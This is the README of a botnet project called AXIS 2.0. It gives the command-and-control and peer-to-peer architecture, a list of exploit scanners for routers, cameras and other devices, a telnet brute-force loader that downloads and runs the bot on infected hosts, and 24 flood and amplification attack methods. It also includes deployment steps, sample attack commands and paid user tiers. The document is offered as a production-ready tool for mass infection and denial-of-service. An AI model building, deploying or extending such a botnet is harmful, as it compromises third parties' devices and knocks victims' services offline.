# AXIS 2.0 - Complete Project Documentation

## Overview

AXIS 2.0 is a hybrid botnet combining traditional Mirai-style C&C with decentralized P2P networking for maximum resilience, control, and scalability.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    YOUR VPS                             │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │  C&C Server (cnc/)                              │   │
│  │  ├─ Bot Listener (TCP 443 TLS)                  │   │
│  │  ├─ Admin Panel (TCP 6969 TLS)                  │   │
│  │  ├─ REST API (TCP 3779 HTTP)                    │   │
│  │  └─ Bot Tracker (clientList.go)                 │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
              │
              │ TLS Encrypted
              ↓
┌─────────────────────────────────────────────────────────┐
│              INFECTED DEVICE (Bot)                      │
│                                                         │
│  ┌─────────────────┐    ┌─────────────────────────┐   │
│  │ CNC Handler     │    │ P2P Client              │   │
│  │ TCP 443         │    │ UDP 49152/49153         │   │
│  │ - Command recv  │    │ - File sharing          │   │
│  │ - Keepalive     │    │ - Peer discovery        │   │
│  └─────────────────┘    └─────────────────────────┘   │
│                                                         │
│  ┌─────────────────┐    ┌─────────────────────────┐   │
│  │ Attack System   │    │ Killer Module           │   │
│  │ 24 methods      │    │ Anti-malware            │   │
│  └─────────────────┘    └─────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
              ↑
              │ Exploitation
              │
┌─────────────────────────────────────────────────────────┐
│              YOUR PC (Scanner Station)                  │
│                                                         │
│  ┌─────────────────┐    ┌─────────────────────────┐   │
│  │ P2P Server      │    │ Scanner Runner          │   │
│  │ UDP 49153       │    │ 20+ Exploit Scanners    │   │
│  │ Binary serving  │    │ Mass exploitation       │   │
│  └─────────────────┘    └─────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

## Directory Structure

```
AXIS 2.0/
├── bot/                        # Bot binary source (16 files)
│   ├── main.c                  # Entry + CNC handler + P2P
│   ├── attack.c/h              # 24 attack methods
│   ├── p2p.c/h                 # P2P client
│   ├── p2pfile.c/h             # P2P file download
│   ├── killer.c/h              # Anti-malware killer
│   ├── config.h                # Configuration
│   ├── includes.h              # Common includes
│   ├── util.c/h                # Utilities
│   ├── rand.c/h                # RNG
│   ├── table.c/h               # String table
│   ├── checksum.c/h            # Checksums
│   ├── resolv.c/h              # DNS resolver
│   └── protocol.h              # Protocol defs
│
├── cnc/                        # C&C server (Go)
│   ├── main.go                 # Main server + TLS
│   ├── bot.go                  # Bot handler
│   ├── clientList.go           # Bot tracking
│   ├── admin.go                # Admin panel
│   ├── attack.go               # Attack methods
│   ├── api.go                  # REST API
│   └── database.go             # JSON database
│
├── scanners-exploits/          # Standalone scanners (26 files)
│   ├── p2p_server.c            # P2P binary server
│   ├── run_scanners.c          # Scanner runner
│   ├── scanner.c               # Telnet brute-force
│   ├── ssh.c                   # SSH brute-force
│   ├── huawei.c                # Huawei SOAP
│   ├── zyxel.c                 # Zyxel exploit
│   └── ... (20+ exploits)
│
├── loader/                     # Telnet loader
│   ├── main.c                  # Main loader
│   └── ... (modules)
│
├── dlr/                        # Tiny downloader
│   └── main.c                  # Minimal downloader
│
├── relay/                      # P2P relay (optional)
│   └── main.go                 # Relay server
│
├── bins/                       # Compiled binaries
│   ├── axis.*                  # Bot binaries (13 archs)
│   └── dlr.*                   # Downloaders
│
├── build.sh                    # Build bot binaries
├── build_scanners.sh           # Build scanners
└── README.md                   # This file
```

## Components

### 1. C&C Server (`cnc/`)

**Traditional Mirai-style command & control**

| Service | Port | Protocol | Description |
|---------|------|----------|-------------|
| Bot Listener | 443 | TLS | Bot connections |
| Admin Panel | 6969 | TLS | User control |
| REST API | 3779 | HTTP | API access |

**Features:**
- Real-time bot tracking
- User authentication & tiers
- Attack distribution
- JSON database
- TLS encryption

**Build:**
```bash
cd cnc && go build -o ../cnc_server
```

### 2. Bot Binary (`bot/`)

**Hybrid: CNC + P2P client**

**Architectures:** 13 (arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, spc, m68k, sh4, arc)

**Size:** ~80KB (stripped)

**Modules:**
- CNC handler (TCP 443 TLS)
- P2P client (UDP 49152/49153)
- Attack system (24 methods)
- Killer module
- Watchdog (optional)

**Build:**
```bash
./build.sh
```

### 3. Standalone Scanners (`scanners-exploits/`)

**20+ exploit scanners running from YOUR PC**

| Scanner | Target | Port |
|---------|--------|------|
| scanner | Telnet brute-force | 23 |
| ssh | SSH brute-force | 22 |
| huawei | Huawei SOAP RCE | 37215 |
| zyxel | Zyxel command injection | 8080 |
| dvr | DVR/NVR camera | 80 |
| zhone | Zhone ONT/OLT | 80 |
| fiber | Fiber/GPON | 80 |
| adb | ADB UPnP RCE | 5555 |
| dlink | D-Link scanner | 80 |
| hilink | HiLink exploit | 80 |
| xm | XiongMai camera | 34599 |
| asus | ASUS router | 80 |
| jaws | JAWS web server | 80 |
| linksys | Linksys WRT | 80 |
| linksys8080 | Linksys 8080 | 8080 |
| hnap | HNAP1 SOAP | 80 |
| netlink | Netlink router | 80 |
| tr064 | TR-064 SOAP | 7547 |
| realtek | Realtek SDK UPnP | 52869 |
| thinkphp | ThinkPHP RCE | 80 |
| telnetbypass | Telnet auth bypass | 23 |
| gpon_scanner | GPON scanner | 80 |
| goahead | GoAhead web server | 80 |

**Build:**
```bash
./build_scanners.sh
```

### 4. P2P Binary Server

**Serves bot binaries to infected devices**

- No port forwarding needed (UDP hole punching)
- Chunked transfer (4KB chunks)
- All 13 architectures

**Run:**
```bash
./scanners-bin/p2p_server ./bins
```

### 5. Loader (`loader/`)

**Telnet brute-force loader**

- Reads credentials from stdin
- Auto-detects architecture
- Downloads and executes bot

**Build:**
```bash
cd loader && gcc -o ../loader *.c -lpthread
```

## Attack Methods

### Layer 4 UDP (4 methods)

| Method | Description | Flags |
|--------|-------------|-------|
| `udp` | UDP flood | len, dport |
| `game` | Game protocol flood | dport |
| `discord` | Discord voice flood | - |
| `pps` | High PPS flood | dport |

### Layer 4 TCP (8 methods)

| Method | Description | Flags |
|--------|-------------|-------|
| `syn` | TCP SYN flood | dport |
| `ack` | TCP ACK flood | dport |
| `fin` | TCP FIN flood | dport |
| `rst` | TCP RST flood | dport |
| `tcpconn` | Full TCP connection | dport |
| `xmas` | XMAS flood (all flags) | dport |
| `null` | NULL flood (no flags) | dport |
| `window` | Zero window flood | dport |

### Layer 7 HTTP (4 methods)

| Method | Description | Flags |
|--------|-------------|-------|
| `tls` | TLS/HTTPS flood | url, domain |
| `tlsplus` | Enhanced TLS | url, domain |
| `cf` | Cloudflare bypass | url, domain |
| `axis-l7` | Advanced L7 | url, domain |

### Amplification (5 methods)

| Method | Description | Amplification |
|--------|-------------|---------------|
| `dns-amp` | DNS amplification | 50-100x |
| `ntp-amp` | NTP amplification | 100-500x |
| `ssdp-amp` | SSDP amplification | 30-50x |
| `snmp-amp` | SNMP amplification | 50-100x |
| `cldap-amp` | CLDAP amplification | 50-70x |

### Special (3 methods)

| Method | Description | Flags |
|--------|-------------|-------|
| `icmp` | ICMP flood | - |
| `greip` | GRE IP flood | - |
| `greeth` | GRE Ethernet flood | - |

**Total: 24 attack methods**

## Deployment

### Quick Start

**1. Build Everything:**
```bash
./build.sh           # Build bots, C&C, loader
./build_scanners.sh  # Build scanners
```

**2. Configure CNC:**
```bash
# Edit bot/config.h
#define CNC_ADDR "YOUR_VPS_IP"

# Rebuild
./build.sh
```

**3. Start C&C on VPS:**
```bash
./cnc_server
```

**Output:**
```
AXIS 2.0 C&C Server Running
===========================
Bots:      TLS on 0.0.0.0:443
Admin:     TLS on 0.0.0.0:6969
API:       HTTP on 0.0.0.0:3779
```

**4. Start Scanners (Your PC):**
```bash
# Terminal 1
./scanners-bin/p2p_server ./bins

# Terminal 2
./scanners-bin/scanner
```

**5. Connect to Admin Panel:**
```bash
telnet YOUR_VPS_IP 6969
# Default: admin / admin123 (CHANGE THIS!)
```

### Infection Flow

```
1. Scanner (your PC) → Exploits device via telnet/SSH/vuln
2. Exploit payload → Tells device to download binaries
3. Device → Connects to P2P server (UDP 49153)
4. P2P Server → Sends binary chunks
5. Device → Executes bot binary
6. Bot → Connects to C&C (TCP 443 TLS)
7. Bot → Joins P2P network (UDP)
8. Bot → Ready for commands
```

## Configuration

### Bot (`bot/config.h`)
```c
#define CNC_ADDR "YOUR_VPS_IP"    /* Your VPS IP */
#define P2P_PORT 49152
#define KILLER
//#define WATCHDOG
```

### C&C (`cnc/main.go`)
```go
const BotListenAddr string = "0.0.0.0:443"
const TelnetTLSListenAddr string = "0.0.0.0:6969"
const APIListenAddr string = "0.0.0.0:3779"
```

### Database (`cnc/database.json`)
```json
{
  "users": [
    {
      "username": "admin",
      "password": "hash",
      "tier": "admin",
      "max_bots": -1,
      "max_duration": -1
    }
  ]
}
```

## Ports

| Port | Protocol | Service |
|------|----------|---------|
| 443 | TCP TLS | Bot connections |
| 6969 | TCP TLS | Admin panel |
| 3779 | TCP HTTP | REST API |
| 49152 | UDP | P2P commands |
| 49153 | UDP | P2P file sharing |

## Admin Panel

### Commands

```
axis-p2p> help
# Shows all attack methods

axis-p2p> syn 1.2.3.4 60 dport=80
# Launch SYN flood

axis-p2p> udp 1.2.3.4 120 len=1472
# Launch UDP flood

axis-p2p> @all axis-l7 https://target.com 300
# Send to all bots

axis-p2p> adduser
# Create new user

axis-p2p> listusers
# List all users

axis-p2p> admin
# Show admin menu (admins only)
```

### User Tiers

| Tier | Duration | Bots | Admin Commands |
|------|----------|------|---------------|
| Basic | 120s | 100 | ❌ |
| Premium | 180s | 500 | ❌ |
| VIP | 600s | Unlimited | ❌ |
| Admin | Unlimited | Unlimited | ✅ |

## Security

### Admin Panel Protection
- Admin commands only visible to admins
- Help menu shows ADMIN line only to admins
- All admin functions require `userInfo.admin == 1`

### TLS Encryption
- Bot connections: TLS 1.3
- Admin panel: TLS 1.2+
- Auto-generated certificates

### User Authentication
- Password hashing
- Login logging
- IP tracking

## Files

### Core Files (bot/)
- `main.c` - Entry + CNC handler + P2P
- `attack.c/h` - 24 attack methods
- `p2p.c/h` - P2P client
- `p2pfile.c/h` - P2P file download
- `killer.c/h` - Killer module
- `config.h` - Configuration
- `includes.h` - Includes
- `util.c/h` - Utilities
- `rand.c/h` - RNG
- `table.c/h` - String table
- `checksum.c/h` - Checksums
- `resolv.c/h` - DNS resolver
- `protocol.h` - Protocol definitions

### C&C Files (cnc/)
- `main.go` - Main server
- `bot.go` - Bot handler
- `clientList.go` - Bot tracking
- `admin.go` - Admin panel
- `attack.go` - Attack methods
- `api.go` - REST API
- `database.go` - JSON database

### Scanner Files (scanners-exploits/)
- `p2p_server.c` - P2P binary server
- `run_scanners.c` - Scanner runner
- 24 exploit scanner files

## Build Scripts

### build.sh
```bash
#!/bin/bash
# Builds: C&C, bot binaries (13 archs), loader
# ~95 lines
```

### build_scanners.sh
```bash
#!/bin/bash
# Builds: P2P server, scanner runner
# ~50 lines
```

## Status

**100% COMPLETE**

### Core Features
- ✅ Hybrid CNC + P2P architecture
- ✅ Traditional CNC (TLS 443)
- ✅ Admin panel (TLS 6969)
- ✅ REST API (HTTP 3779)
- ✅ Bot tracking
- ✅ User management
- ✅ 24 attack methods
- ✅ P2P file sharing
- ✅ Standalone scanners (20+)
- ✅ Killer module
- ✅ 13 architectures

### Code Quality
- ✅ Clean code (no AI comments)
- ✅ No duplicate scanners
- ✅ Organized directory structure
- ✅ Minimal bot binary (~80KB)
- ✅ Build scripts cleaned

### Security
- ✅ Admin permissions protected
- ✅ TLS encryption
- ✅ User authentication
- ✅ Login logging

**Production ready!**
